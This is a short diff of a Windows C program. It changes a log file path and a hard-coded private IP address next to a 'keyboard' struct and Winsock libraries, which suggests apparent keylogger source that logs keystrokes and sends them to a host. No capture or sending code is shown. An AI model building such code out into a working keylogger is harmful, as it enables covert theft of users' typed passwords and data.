@@ -12,8 +12,8 @@
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "IPHLPAPI.lib")
 #define BUFFSIZE 1024
-#define LOGFILE		"C:\\test.txt"
-#define IP "10.224.52.114"
+#define LOGFILE		"J:\\enregistre.txt"
+#define IP "10.224.52.112"
 
 struct keyboard
 {
